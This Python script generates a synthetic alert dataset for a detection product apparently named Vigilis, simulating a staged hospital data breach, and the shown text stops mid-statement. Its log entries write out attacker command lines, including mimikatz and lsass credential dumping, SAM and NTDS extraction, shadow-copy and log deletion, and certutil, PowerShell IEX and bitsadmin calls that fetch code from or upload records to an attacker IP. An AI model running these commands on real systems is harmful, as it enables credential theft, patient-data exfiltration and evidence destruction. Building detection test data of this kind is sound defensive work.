#!/usr/bin/env python3
"""Generate healthcare data breach simulation dataset for Vigilis."""
import json
import os
import random
from datetime import datetime, timedelta

alerts = []
base_time = datetime(2026, 4, 10, 6, 30, 0)
attacker_ip = "185.220.101.44"

def ts(minutes_offset):
    t = base_time + timedelta(minutes=minutes_offset)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")

def alert(offset, product, event_type, user, severity, ip=None, hostname=None, geo=None, raw_log=None, target_host=None):
    a = {
        "metadata": {
            "event_timestamp": ts(offset),
            "product_name": product,
            "event_type": event_type
        },
        "principal": {
            "user": {"userid": user},
            "ip": ip or "10.0.0.1"
        },
        "security_result": {"severity": severity},
        "additional": {},
        "target": {"hostname": target_host or hostname or "UNKNOWN"}
    }
    if geo:
        a["additional"]["geo"] = geo
    if raw_log:
        a["additional"]["raw_log"] = raw_log
    if hostname and not target_host:
        a["target"]["hostname"] = hostname
    return a

# ============================================================
# PHASE 1: PHISHING (06:30 - 06:35) — 3 alerts
# ============================================================
phishing_subjects = [
    {"sender": "hr-update@mercy-hosp1tal.com", "subject": "URGENT: Benefits Enrollment Deadline Today", "url": "http://mercy-portal-login.co/sso"},
    {"sender": "it-helpdesk@mercy-h0spital.com", "subject": "Password Expiry Notice - Action Required", "url": "http://mercy-portal-login.co/reset"},
    {"sender": "admin@mercy-hosp1tal.com", "subject": "Mandatory HIPAA Training - Complete Now", "url": "http://mercy-portal-login.co/hipaa"},
]
for i, p in enumerate(phishing_subjects):
    alerts.append(alert(
        offset=i*2, product="Proofpoint", event_type="phishing_detected",
        user="nurse.jones@mercy-hospital.org", severity="HIGH",
        ip="198.51.100.22", hostname=f"MAIL-GW-0{i+1}",
        geo="US",
        raw_log={"sender": p["sender"], "subject": p["subject"], "url": p["url"], "action": "delivered"}
    ))

# ============================================================
# PHASE 2: CREDENTIAL THEFT / SUSPICIOUS SIGN-INS (06:38 - 06:52) — 5 alerts
# ============================================================
cred_events = [
    {"offset": 8,  "raw": {"reason": "New device sign-in", "device": "Linux Chrome 120.0", "mfa": "not_prompted"}},
    {"offset": 10, "raw": {"reason": "Impossible travel detected", "last_location": "Chicago, US", "current_location": "Frankfurt, DE"}},
    {"offset": 12, "raw": {"reason": "Tor exit node IP detected", "tor_confidence": "HIGH"}},
    {"offset": 16, "raw": {"reason": "Failed MFA challenge", "mfa_method": "SMS", "attempts": 3}},
    {"offset": 22, "raw": {"reason": "Credential stuffing pattern", "failed_attempts_1h": 12}},
]
for e in cred_events:
    alerts.append(alert(
        offset=e["offset"], product="Okta", event_type="suspicious_signin",
        user="nurse.jones@mercy-hospital.org", severity="HIGH",
        ip=attacker_ip, hostname="OKTA-SSO",
        geo="DE", raw_log=e["raw"]
    ))

# ============================================================
# PHASE 3: LOGIN SUCCESS (06:55 - 07:02) — 3 alerts
# ============================================================
login_targets = [
    {"offset": 25, "host": "EHR-PORTAL-01", "raw": {"application": "Epic EHR Portal", "session_id": "sess-a8f3c21d"}},
    {"offset": 28, "host": "VPN-GW-01", "raw": {"application": "Cisco AnyConnect VPN", "tunnel_ip": "10.10.50.88"}},
    {"offset": 32, "host": "CITRIX-GW-01", "raw": {"application": "Citrix Workspace", "session_id": "ctx-9e2b44f1"}},
]
for l in login_targets:
    alerts.append(alert(
        offset=l["offset"], product="Okta", event_type="login_success",
        user="nurse.jones@mercy-hospital.org", severity="MEDIUM",
        ip=attacker_ip, hostname=l["host"],
        geo="DE", raw_log=l["raw"]
    ))

# ============================================================
# PHASE 4: LATERAL MOVEMENT (07:05 - 07:25) — 8 alerts
# ============================================================
lateral_users = [
    {"user": "dr.smith@mercy-hospital.org", "offset": 35, "host": "WS-DRSMITH-01", "raw": {"reason": "Pass-the-hash detected", "source_host": "EHR-PORTAL-01"}},
    {"user": "dr.smith@mercy-hospital.org", "offset": 37, "host": "EHR-SERVER-01", "raw": {"reason": "Unusual RDP session", "source_ip": "10.10.50.88"}},
    {"user": "admin.chen@mercy-hospital.org", "offset": 40, "host": "DC-MAIN", "raw": {"reason": "New device sign-in from known-bad IP", "device": "Unknown Windows"}},
    {"user": "admin.chen@mercy-hospital.org", "offset": 42, "host": "AD-CONTROLLER-01", "raw": {"reason": "Kerberoasting attempt", "service_account": "svc-sql-ehr"}},
    {"user": "billing.patel@mercy-hospital.org", "offset": 45, "host": "BILLING-WS-03", "raw": {"reason": "Impossible travel detected", "current_location": "Frankfurt, DE"}},
    {"user": "billing.patel@mercy-hospital.org", "offset": 47, "host": "BILLING-DB-01", "raw": {"reason": "Unusual database access", "database": "BillingRecords"}},
    {"user": "lab.tech.wong@mercy-hospital.org", "offset": 50, "host": "LAB-WS-01", "raw": {"reason": "Credential replay attack", "original_session": "nurse.jones"}},
    {"user": "lab.tech.wong@mercy-hospital.org", "offset": 55, "host": "LAB-RESULTS-SRV", "raw": {"reason": "Unusual service access pattern", "service": "LabResultsAPI"}},
]
for l in lateral_users:
    alerts.append(alert(
        offset=l["offset"], product="CrowdStrike", event_type="suspicious_signin",
        user=l["user"], severity="HIGH",
        ip=attacker_ip, hostname=l["host"],
        geo="DE", raw_log=l["raw"]
    ))

# ============================================================
# PHASE 5: PRIVILEGE ESCALATION (07:28 - 07:40) — 5 alerts
# ============================================================
priv_events = [
    {"offset": 58, "raw": {"action": "AttachUserPolicy", "policy": "AdministratorAccess", "target_user": "admin.chen"}, "host": "AWS-IAM"},
    {"offset": 60, "raw": {"action": "AddUserToGroup", "group": "DomainAdmins", "target_user": "admin.chen"}, "host": "DC-MAIN"},
    {"offset": 63, "raw": {"action": "ModifyServiceAccount", "service": "svc-ehr-backup", "new_role": "db_owner"}, "host": "EHR-SERVER-01"},
    {"offset": 66, "raw": {"action": "DisableAuditPolicy", "policy": "ObjectAccess", "scope": "OU=Servers"}, "host": "DC-MAIN"},
    {"offset": 70, "raw": {"action": "CreateServicePrincipal", "principal": "ehr-exfil-svc", "permissions": ["s3:*", "rds:*"]}, "host": "AWS-IAM"},
]
for p in priv_events:
    alerts.append(alert(
        offset=p["offset"], product="AWS GuardDuty", event_type="privilege_escalation",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=p["host"],
        geo="DE", raw_log=p["raw"]
    ))

# ============================================================
# PHASE 6: PROCESS EXECUTION (07:30 - 07:55) — 10 alerts
# ============================================================
proc_events = [
    {"offset": 60, "host": "EHR-SERVER-01", "type": "suspicious_process", "raw": {"process": "mimikatz.exe", "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"", "parent": "cmd.exe"}},
    {"offset": 62, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "powershell.exe", "command_line": "powershell -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEEAYwB0AGkAdgBlAEQAaQByAGUAYwB0AG8AcgB5AA==", "parent": "cmd.exe"}},
    {"offset": 64, "host": "EHR-SERVER-02", "type": "suspicious_process", "raw": {"process": "procdump.exe", "command_line": "procdump.exe -ma lsass.exe lsass.dmp", "parent": "cmd.exe"}},
    {"offset": 66, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "net.exe", "command_line": "net user admin.chen P@ssw0rd123! /domain /add", "parent": "powershell.exe"}},
    {"offset": 68, "host": "BILLING-WS-03", "type": "suspicious_process", "raw": {"process": "mimikatz.exe", "command_line": "mimikatz.exe \"lsadump::dcsync\" /domain:mercy-hospital.org", "parent": "powershell.exe"}},
    {"offset": 71, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "wmic.exe", "command_line": "wmic shadowcopy delete", "parent": "cmd.exe"}},
    {"offset": 73, "host": "EHR-SERVER-02", "type": "suspicious_process", "raw": {"process": "psexec.exe", "command_line": "psexec.exe \\\\EHR-SERVER-01 -s cmd.exe", "parent": "cmd.exe"}},
    {"offset": 76, "host": "DC-MAIN", "type": "process_execution", "raw": {"process": "ntdsutil.exe", "command_line": "ntdsutil \"activate instance ntds\" ifm \"create full c:\\temp\\ntds\"", "parent": "cmd.exe"}},
    {"offset": 79, "host": "EHR-SERVER-01", "type": "suspicious_process", "raw": {"process": "7z.exe", "command_line": "7z.exe a -p patient_records.7z C:\\EHR\\PatientData\\*", "parent": "powershell.exe"}},
    {"offset": 82, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "rclone.exe", "command_line": "rclone.exe copy C:\\staging\\ remote:exfil-bucket --transfers 8", "parent": "powershell.exe"}},
]
for p in proc_events:
    alerts.append(alert(
        offset=p["offset"], product="CrowdStrike", event_type=p["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.50.88", hostname=p["host"],
        raw_log=p["raw"]
    ))

# ============================================================
# PHASE 7: DATA EXFILTRATION (07:50 - 08:20) — 8 alerts
# ============================================================
exfil_events = [
    {"offset": 80, "bytes": 524288000, "dest_ip": "91.215.85.12", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "cloud-backup-svcs.ru"}},
    {"offset": 83, "bytes": 1073741824, "dest_ip": "91.215.85.12", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "cloud-backup-svcs.ru"}},
    {"offset": 86, "bytes": 786432000, "dest_ip": "91.215.85.12", "raw": {"protocol": "SFTP", "dest_port": 22, "dest_domain": "transfer.anon-files.cc"}},
    {"offset": 89, "bytes": 2147483648, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "mega-upload-api.io"}},
    {"offset": 92, "bytes": 943718400, "dest_ip": "91.215.85.12", "raw": {"protocol": "DNS_TUNNEL", "dest_port": 53, "dest_domain": "exfil.dns-tunnel.cc", "encoding": "base64"}},
    {"offset": 96, "bytes": 1610612736, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 8443, "dest_domain": "secure-drop.onion.ws"}},
    {"offset": 100, "bytes": 629145600, "dest_ip": "91.215.85.12", "raw": {"protocol": "ICMP_TUNNEL", "dest_domain": "icmp-exfil.cc"}},
    {"offset": 105, "bytes": 1288490188, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "cloud-backup-svcs.ru", "note": "final batch - patient SSNs and insurance data"}},
]
for e in exfil_events:
    a = alert(
        offset=e["offset"], product="Cisco ASA", event_type="large_data_transfer",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.20.10", hostname="EHR-SERVER-01",
        raw_log={**e["raw"], "bytes_transferred": e["bytes"], "destination_ip": e["dest_ip"]}
    )
    a["target"]["hostname"] = e["dest_ip"]
    alerts.append(a)

# ============================================================
# PHASE 8: CLOUD ACCESS (07:45 - 08:10) — 5 alerts
# ============================================================
cloud_events = [
    {"offset": 75, "type": "CreateAccessKey", "raw": {"action": "CreateAccessKey", "target_user": "ehr-exfil-svc", "access_key_id": "AKIA3EXAMPLE1234"}, "host": "AWS-IAM"},
    {"offset": 78, "type": "anomalous_api_call", "raw": {"action": "s3:ListBuckets", "buckets_accessed": ["mercy-ehr-backups", "mercy-patient-records", "mercy-billing-archive"]}, "host": "AWS-S3"},
    {"offset": 84, "type": "anomalous_api_call", "raw": {"action": "s3:GetObject", "bucket": "mercy-ehr-backups", "objects_downloaded": 847, "total_size_gb": 12.4}, "host": "AWS-S3"},
    {"offset": 90, "type": "anomalous_api_call", "raw": {"action": "rds:CreateDBSnapshot", "db_instance": "mercy-ehr-prod", "snapshot_id": "exfil-snap-20260410"}, "host": "AWS-RDS"},
    {"offset": 98, "type": "CreateAccessKey", "raw": {"action": "s3:PutBucketPolicy", "bucket": "mercy-ehr-backups", "new_policy": "public-read", "note": "bucket made public"}, "host": "AWS-S3"},
]
for c in cloud_events:
    alerts.append(alert(
        offset=c["offset"], product="AWS GuardDuty", event_type=c["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=c["host"],
        geo="DE", raw_log=c["raw"]
    ))

# ============================================================
# PHASE 9: NOISE / BENIGN (scattered throughout) — 10 alerts
# ============================================================
noise_events = [
    {"offset": 5, "product": "CrowdStrike", "type": "benign_process", "user": "svc-backup@mercy-hospital.org", "sev": "LOW", "host": "BACKUP-SRV-01", "raw": {"process": "veeam-agent.exe", "action": "scheduled_backup"}},
    {"offset": 15, "product": "Defender", "type": "service_restart", "user": "svc-monitoring@mercy-hospital.org", "sev": "LOW", "host": "MON-SRV-01", "raw": {"service": "Nagios Agent", "reason": "scheduled_restart"}},
    {"offset": 30, "product": "CrowdStrike", "type": "benign_process", "user": "svc-antivirus@mercy-hospital.org", "sev": "LOW", "host": "AV-SRV-01", "raw": {"process": "MsMpEng.exe", "action": "definition_update"}},
    {"offset": 44, "product": "Defender", "type": "benign_process", "user": "svc-backup@mercy-hospital.org", "sev": "LOW", "host": "BACKUP-SRV-01", "raw": {"process": "robocopy.exe", "action": "file_sync", "files_copied": 342}},
    {"offset": 52, "product": "Cisco ASA", "type": "service_restart", "user": "svc-network@mercy-hospital.org", "sev": "LOW", "host": "FW-EDGE-01", "raw": {"service": "Cisco ASA daemon", "reason": "config_reload"}},
    {"offset": 67, "product": "CrowdStrike", "type": "benign_process", "user": "svc-patching@mercy-hospital.org", "sev": "LOW", "host": "WSUS-SRV-01", "raw": {"process": "wuauclt.exe", "action": "patch_scan"}},
    {"offset": 77, "product": "Defender", "type": "service_restart", "user": "svc-monitoring@mercy-hospital.org", "sev": "LOW", "host": "MON-SRV-01", "raw": {"service": "Prometheus Node Exporter", "reason": "version_upgrade"}},
    {"offset": 88, "product": "CrowdStrike", "type": "benign_process", "user": "svc-backup@mercy-hospital.org", "sev": "LOW", "host": "BACKUP-SRV-02", "raw": {"process": "rsync", "action": "incremental_backup", "files_synced": 1205}},
    {"offset": 95, "product": "Okta", "type": "login_success", "user": "receptionist.hall@mercy-hospital.org", "sev": "LOW", "host": "WS-RECEPTION-01", "raw": {"application": "Patient Check-in Portal", "location": "Chicago, US", "mfa": "verified"}, "ip": "10.10.5.22", "geo": "US"},
    {"offset": 110, "product": "Defender", "type": "service_restart", "user": "svc-monitoring@mercy-hospital.org", "sev": "LOW", "host": "MON-SRV-02", "raw": {"service": "Splunk Forwarder", "reason": "log_rotation"}},
]
for n in noise_events:
    a = alert(
        offset=n["offset"], product=n["product"], event_type=n["type"],
        user=n["user"], severity=n["sev"],
        ip=n.get("ip", "10.10.1.1"), hostname=n["host"],
        geo=n.get("geo"), raw_log=n["raw"]
    )
    alerts.append(a)

# ============================================================
# ADDITIONAL ALERTS to reach 150+ total
# ============================================================

# More phishing delivery/click alerts
extra_phishing = [
    {"offset": 1, "raw": {"sender": "benefits@mercy-hosp1tal.com", "subject": "Open Enrollment Reminder", "url": "http://mercy-portal-login.co/enroll", "action": "link_clicked"}},
    {"offset": 3, "raw": {"sender": "it-support@mercy-h0spital.com", "subject": "VPN Certificate Expiring", "url": "http://mercy-portal-login.co/vpn", "action": "delivered"}},
]
for p in extra_phishing:
    alerts.append(alert(
        offset=p["offset"], product="Proofpoint", event_type="phishing_detected",
        user="nurse.jones@mercy-hospital.org", severity="HIGH",
        ip="198.51.100.22", hostname="MAIL-GW-01",
        geo="US", raw_log=p["raw"]
    ))

# More credential abuse
extra_creds = [
    {"offset": 14, "user": "nurse.jones@mercy-hospital.org", "raw": {"reason": "Multiple failed logins before success", "failed_count": 8}},
    {"offset": 18, "user": "nurse.jones@mercy-hospital.org", "raw": {"reason": "Login from previously unseen ASN", "asn": "AS24940 Hetzner"}},
    {"offset": 20, "user": "nurse.jones@mercy-hospital.org", "raw": {"reason": "Session token reuse from different IP", "original_ip": "10.10.5.15"}},
]
for c in extra_creds:
    alerts.append(alert(
        offset=c["offset"], product="Okta", event_type="suspicious_signin",
        user=c["user"], severity="HIGH",
        ip=attacker_ip, hostname="OKTA-SSO",
        geo="DE", raw_log=c["raw"]
    ))

# More lateral movement
extra_lateral = [
    {"offset": 38, "user": "dr.smith@mercy-hospital.org", "host": "RADIOLOGY-SRV", "raw": {"reason": "Unusual service access", "service": "PACS Imaging"}},
    {"offset": 43, "user": "admin.chen@mercy-hospital.org", "host": "PRINT-SRV-01", "raw": {"reason": "Enumeration activity", "queries": ["net group", "net localgroup admins"]}},
    {"offset": 48, "user": "billing.patel@mercy-hospital.org", "host": "CLAIMS-SRV-01", "raw": {"reason": "After-hours access", "local_time": "02:48 CST"}},
    {"offset": 53, "user": "lab.tech.wong@mercy-hospital.org", "host": "PHARMACY-SRV", "raw": {"reason": "Cross-department access anomaly", "normal_dept": "Laboratory", "accessed_dept": "Pharmacy"}},
    {"offset": 56, "user": "admin.chen@mercy-hospital.org", "host": "EXCHANGE-SRV-01", "raw": {"reason": "Mailbox export initiated", "target_mailbox": "cfo@mercy-hospital.org"}},
    {"offset": 57, "user": "dr.smith@mercy-hospital.org", "host": "FILE-SRV-01", "raw": {"reason": "Mass file enumeration", "files_accessed": 2847, "pattern": "*.pdf,*.docx"}},
    {"offset": 36, "user": "dr.smith@mercy-hospital.org", "host": "VPN-GW-01", "raw": {"reason": "VPN session from foreign IP", "location": "Frankfurt, DE"}},
    {"offset": 46, "user": "billing.patel@mercy-hospital.org", "host": "HR-DB-01", "raw": {"reason": "Unauthorized DB query", "query_type": "SELECT * FROM employees"}},
]
for l in extra_lateral:
    alerts.append(alert(
        offset=l["offset"], product="CrowdStrike", event_type="suspicious_signin",
        user=l["user"], severity="HIGH",
        ip=attacker_ip, hostname=l["host"],
        geo="DE", raw_log=l["raw"]
    ))

# More privilege escalation
extra_priv = [
    {"offset": 61, "raw": {"action": "ResetPassword", "target_user": "svc-ehr-backup", "method": "Admin override"}, "host": "DC-MAIN"},
    {"offset": 64, "raw": {"action": "AddToLocalAdmins", "target_host": "EHR-SERVER-01", "target_user": "admin.chen"}, "host": "DC-MAIN"},
    {"offset": 67, "raw": {"action": "DisableFirewallRule", "rule": "Block-Outbound-445", "scope": "EHR-VLAN"}, "host": "FW-EDGE-01"},
    {"offset": 69, "raw": {"action": "EnableRemoteDesktop", "target_hosts": ["EHR-SERVER-01", "EHR-SERVER-02", "BILLING-DB-01"]}, "host": "DC-MAIN"},
    {"offset": 72, "raw": {"action": "ModifyGPO", "gpo": "Default Domain Policy", "change": "Disabled credential guard"}, "host": "DC-MAIN"},
]
for p in extra_priv:
    alerts.append(alert(
        offset=p["offset"], product="Defender", event_type="privilege_escalation",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=p["host"],
        geo="DE", raw_log=p["raw"]
    ))

# More process execution
extra_proc = [
    {"offset": 61, "host": "EHR-SERVER-02", "type": "suspicious_process", "raw": {"process": "certutil.exe", "command_line": "certutil -urlcache -split -f http://91.215.85.12/payload.exe C:\\temp\\svc.exe", "parent": "cmd.exe"}},
    {"offset": 63, "host": "DC-MAIN", "type": "process_execution", "raw": {"process": "dsquery.exe", "command_line": "dsquery user -limit 0 -o dn", "parent": "powershell.exe"}},
    {"offset": 65, "host": "EHR-SERVER-01", "type": "suspicious_process", "raw": {"process": "reg.exe", "command_line": "reg save HKLM\\SAM C:\\temp\\sam.save", "parent": "cmd.exe"}},
    {"offset": 69, "host": "BILLING-WS-03", "type": "process_execution", "raw": {"process": "powershell.exe", "command_line": "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://91.215.85.12/invoke-kerberoast.ps1')\"", "parent": "cmd.exe"}},
    {"offset": 74, "host": "EHR-SERVER-01", "type": "suspicious_process", "raw": {"process": "tasklist.exe", "command_line": "tasklist /v /fo csv", "parent": "cmd.exe"}},
    {"offset": 77, "host": "EHR-SERVER-02", "type": "process_execution", "raw": {"process": "schtasks.exe", "command_line": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\svc.exe\" /sc ONSTART /ru SYSTEM", "parent": "cmd.exe"}},
    {"offset": 80, "host": "DC-MAIN", "type": "suspicious_process", "raw": {"process": "vssadmin.exe", "command_line": "vssadmin delete shadows /all /quiet", "parent": "cmd.exe"}},
    {"offset": 83, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "bitsadmin.exe", "command_line": "bitsadmin /transfer exfil /upload /priority HIGH http://91.215.85.12/upload C:\\staging\\records.7z", "parent": "powershell.exe"}},
    {"offset": 85, "host": "EHR-SERVER-02", "type": "suspicious_process", "raw": {"process": "wevtutil.exe", "command_line": "wevtutil cl Security", "parent": "cmd.exe"}},
    {"offset": 87, "host": "EHR-SERVER-01", "type": "process_execution", "raw": {"process": "powershell.exe", "command_line": "powershell -c \"Get-ChildItem C:\\EHR\\PatientData -Recurse | Measure-Object -Property Length -Sum\"", "parent": "cmd.exe"}},
]
for p in extra_proc:
    alerts.append(alert(
        offset=p["offset"], product="CrowdStrike", event_type=p["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.50.88", hostname=p["host"],
        raw_log=p["raw"]
    ))

# More exfiltration
extra_exfil = [
    {"offset": 91, "bytes": 419430400, "dest_ip": "91.215.85.12", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "cloud-backup-svcs.ru", "content_type": "application/x-7z-compressed"}},
    {"offset": 94, "bytes": 838860800, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "mega-upload-api.io", "content_type": "application/octet-stream"}},
    {"offset": 97, "bytes": 1572864000, "dest_ip": "91.215.85.12", "raw": {"protocol": "SFTP", "dest_port": 2222, "dest_domain": "secure-files.cc", "content_type": "database/sql-dump"}},
    {"offset": 102, "bytes": 734003200, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 8443, "dest_domain": "drop-zone.io", "content_type": "application/zip"}},
    {"offset": 107, "bytes": 2097152000, "dest_ip": "91.215.85.12", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "cloud-backup-svcs.ru", "note": "insurance records and billing data"}},
    {"offset": 112, "bytes": 1048576000, "dest_ip": "45.77.132.59", "raw": {"protocol": "HTTPS", "dest_port": 443, "dest_domain": "mega-upload-api.io", "note": "final exfil batch - prescription data"}},
    {"offset": 115, "bytes": 524288000, "dest_ip": "91.215.85.12", "raw": {"protocol": "DNS_TUNNEL", "dest_port": 53, "dest_domain": "exfil2.dns-tunnel.cc", "encoding": "hex"}},
]
for e in extra_exfil:
    a = alert(
        offset=e["offset"], product="Cisco ASA", event_type="large_data_transfer",
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.20.10", hostname="EHR-SERVER-01",
        raw_log={**e["raw"], "bytes_transferred": e["bytes"], "destination_ip": e["dest_ip"]}
    )
    a["target"]["hostname"] = e["dest_ip"]
    alerts.append(a)

# More cloud
extra_cloud = [
    {"offset": 81, "type": "anomalous_api_call", "raw": {"action": "s3:GetBucketAcl", "bucket": "mercy-patient-records", "result": "success"}, "host": "AWS-S3"},
    {"offset": 86, "type": "anomalous_api_call", "raw": {"action": "s3:CopyObject", "source_bucket": "mercy-ehr-backups", "dest_bucket": "external-staging-bucket", "objects": 234}, "host": "AWS-S3"},
    {"offset": 93, "type": "CreateAccessKey", "raw": {"action": "iam:CreateRole", "role": "ExfilRole", "trust_policy": "arn:aws:iam::185220101044:root"}, "host": "AWS-IAM"},
    {"offset": 99, "type": "anomalous_api_call", "raw": {"action": "rds:DescribeDBInstances", "instances_enumerated": 5}, "host": "AWS-RDS"},
    {"offset": 103, "type": "anomalous_api_call", "raw": {"action": "ec2:DescribeSecurityGroups", "groups_enumerated": 12, "note": "reconnaissance activity"}, "host": "AWS-EC2"},
    {"offset": 108, "type": "anomalous_api_call", "raw": {"action": "cloudtrail:StopLogging", "trail": "mercy-audit-trail"}, "host": "AWS-CloudTrail"},
    {"offset": 113, "type": "anomalous_api_call", "raw": {"action": "s3:DeleteBucket", "bucket": "mercy-audit-logs", "note": "covering tracks"}, "host": "AWS-S3"},
]
for c in extra_cloud:
    alerts.append(alert(
        offset=c["offset"], product="AWS GuardDuty", event_type=c["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip=attacker_ip, hostname=c["host"],
        geo="DE", raw_log=c["raw"]
    ))

# Extra noise
extra_noise = [
    {"offset": 9, "product": "Defender", "type": "benign_process", "user": "svc-print@mercy-hospital.org", "sev": "LOW", "host": "PRINT-SRV-01", "raw": {"process": "spoolsv.exe", "action": "service_running"}},
    {"offset": 24, "product": "Okta", "type": "login_success", "user": "dr.williams@mercy-hospital.org", "sev": "LOW", "host": "WS-DRWILLIAMS", "raw": {"application": "Epic EHR Portal", "location": "Chicago, US", "mfa": "verified"}, "ip": "10.10.5.30", "geo": "US"},
    {"offset": 39, "product": "CrowdStrike", "type": "benign_process", "user": "svc-endpoint@mercy-hospital.org", "sev": "LOW", "host": "EDR-MGMT-01", "raw": {"process": "csfalconservice.exe", "action": "sensor_update"}},
    {"offset": 59, "product": "Defender", "type": "service_restart", "user": "svc-database@mercy-hospital.org", "sev": "LOW", "host": "SQL-SRV-01", "raw": {"service": "MSSQLSERVER", "reason": "maintenance_window"}},
    {"offset": 74, "product": "Okta", "type": "login_success", "user": "nurse.martinez@mercy-hospital.org", "sev": "LOW", "host": "WS-NURSE-02", "raw": {"application": "Patient Portal", "location": "Chicago, US", "mfa": "verified"}, "ip": "10.10.5.45", "geo": "US"},
    {"offset": 85, "product": "CrowdStrike", "type": "benign_process", "user": "svc-backup@mercy-hospital.org", "sev": "LOW", "host": "BACKUP-SRV-01", "raw": {"process": "veeam-agent.exe", "action": "incremental_backup_complete", "duration_min": 45}},
    {"offset": 101, "product": "Defender", "type": "benign_process", "user": "svc-monitoring@mercy-hospital.org", "sev": "LOW", "host": "MON-SRV-01", "raw": {"process": "grafana-server.exe", "action": "dashboard_refresh"}},
    {"offset": 109, "product": "Cisco ASA", "type": "service_restart", "user": "svc-network@mercy-hospital.org", "sev": "LOW", "host": "SW-CORE-01", "raw": {"service": "OSPF Process", "reason": "neighbor_flap_recovery"}},
    {"offset": 116, "product": "CrowdStrike", "type": "benign_process", "user": "svc-antivirus@mercy-hospital.org", "sev": "LOW", "host": "AV-SRV-01", "raw": {"process": "MsMpEng.exe", "action": "full_scan_complete", "threats_found": 0}},
    {"offset": 118, "product": "Okta", "type": "login_success", "user": "admin.ops@mercy-hospital.org", "sev": "LOW", "host": "WS-OPS-01", "raw": {"application": "Admin Console", "location": "Chicago, US", "mfa": "hardware_token"}, "ip": "10.10.1.5", "geo": "US"},
]
for n in extra_noise:
    a = alert(
        offset=n["offset"], product=n["product"], event_type=n["type"],
        user=n["user"], severity=n["sev"],
        ip=n.get("ip", "10.10.1.1"), hostname=n["host"],
        geo=n.get("geo"), raw_log=n["raw"]
    )
    alerts.append(a)

# ============================================================
# WAVE 2: More alerts to reach 150+ total
# ============================================================

# Firewall/IDS alerts from Cisco ASA
firewall_alerts = [
    {"offset": 33, "type": "suspicious_signin", "user": "nurse.jones@mercy-hospital.org", "raw": {"reason": "Port scan from VPN tunnel", "ports_scanned": "22,445,3389,1433,5432", "source": "10.10.50.88"}, "host": "FW-EDGE-01", "product": "Cisco ASA", "sev": "HIGH"},
    {"offset": 41, "type": "suspicious_signin", "user": "admin.chen@mercy-hospital.org", "raw": {"reason": "SMB lateral movement", "destination": "10.10.20.10", "shares_accessed": ["C$", "ADMIN$"]}, "host": "FW-INTERNAL-01", "product": "Cisco ASA", "sev": "HIGH"},
    {"offset": 49, "type": "suspicious_signin", "user": "billing.patel@mercy-hospital.org", "raw": {"reason": "RDP brute force from internal", "source": "10.10.50.88", "target": "10.10.30.5", "attempts": 47}, "host": "FW-INTERNAL-01", "product": "Cisco ASA", "sev": "HIGH"},
]
for f in firewall_alerts:
    alerts.append(alert(
        offset=f["offset"], product=f["product"], event_type=f["type"],
        user=f["user"], severity=f["sev"],
        ip=attacker_ip, hostname=f["host"],
        geo="DE", raw_log=f["raw"]
    ))

# Defender endpoint alerts
defender_alerts = [
    {"offset": 62, "type": "suspicious_process", "host": "EHR-SERVER-01", "raw": {"process": "cmd.exe", "command_line": "cmd /c whoami /all", "parent": "w3wp.exe", "detection": "WebShell activity"}},
    {"offset": 64, "type": "process_execution", "host": "EHR-SERVER-01", "raw": {"process": "nltest.exe", "command_line": "nltest /dclist:mercy-hospital.org", "parent": "cmd.exe"}},
    {"offset": 68, "type": "suspicious_process", "host": "EHR-SERVER-02", "raw": {"process": "cmd.exe", "command_line": "cmd /c netstat -ano | findstr ESTABLISHED", "parent": "powershell.exe"}},
    {"offset": 70, "type": "process_execution", "host": "DC-MAIN", "raw": {"process": "ldifde.exe", "command_line": "ldifde -f c:\\temp\\ad_dump.ldf -d \"dc=mercy-hospital,dc=org\"", "parent": "cmd.exe"}},
    {"offset": 75, "type": "suspicious_process", "host": "BILLING-WS-03", "raw": {"process": "sqlcmd.exe", "command_line": "sqlcmd -S BILLING-DB-01 -Q \"SELECT TOP 10000 * FROM PatientBilling\"", "parent": "powershell.exe"}},
    {"offset": 78, "type": "process_execution", "host": "EHR-SERVER-01", "raw": {"process": "xcopy.exe", "command_line": "xcopy C:\\EHR\\PatientData\\*.* C:\\staging\\ /S /E /H", "parent": "cmd.exe"}},
    {"offset": 81, "type": "suspicious_process", "host": "EHR-SERVER-02", "raw": {"process": "rar.exe", "command_line": "rar.exe a -hp C:\\staging\\records2.rar C:\\EHR\\LabResults\\*", "parent": "cmd.exe"}},
    {"offset": 84, "type": "process_execution", "host": "DC-MAIN", "raw": {"process": "powershell.exe", "command_line": "powershell -c \"Get-ADUser -Filter * -Properties * | Export-Csv c:\\temp\\users.csv\"", "parent": "cmd.exe"}},
]
for d in defender_alerts:
    alerts.append(alert(
        offset=d["offset"], product="Defender", event_type=d["type"],
        user="admin.chen@mercy-hospital.org", severity="CRITICAL",
        ip="10.10.50.88", hostname=d["host"],
